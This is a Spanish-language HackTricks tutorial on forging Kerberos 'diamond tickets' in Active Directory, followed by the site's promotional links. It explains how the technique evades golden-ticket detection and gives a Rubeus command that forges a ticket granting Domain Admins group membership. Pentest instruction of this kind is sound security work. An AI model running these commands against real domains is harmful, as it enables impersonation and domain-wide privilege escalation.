## Diamond Ticket

Similar a un boleto dorado, un boleto de diamante es un TGT que se puede utilizar para acceder a cualquier servicio como cualquier usuario. Un boleto dorado se forja completamente sin conexión, se cifra con el hash krbtgt de ese dominio y luego se pasa a una sesión de inicio de sesión para su uso. Debido a que los controladores de dominio no rastrean los TGT que han emitido legítimamente, aceptarán felizmente TGT que estén cifrados con su propio hash krbtgt.

Existen dos técnicas comunes para detectar el uso de boletos dorados:

* Buscar TGS-REQ que no tienen un AS-REQ correspondiente.
* Buscar TGT que tienen valores absurdos, como el tiempo de vida predeterminado de 10 años de Mimikatz.

Un **boleto de diamante** se crea **modificando los campos de un TGT legítimo que fue emitido por un DC**. Esto se logra **solicitando** un **TGT**, **descifrando** con el hash krbtgt del dominio, **modificando** los campos deseados del boleto y luego **volviéndolo a cifrar**. Esto **supera las dos deficiencias mencionadas anteriormente** de un boleto dorado porque:

* Los TGS-REQ tendrán un AS-REQ precedente.
* El TGT fue emitido por un DC, lo que significa que tendrá todos los detalles correctos de la política de Kerberos del dominio. Aunque estos se pueden forjar con precisión en un boleto dorado, es más complejo y está abierto a errores.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash. 
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
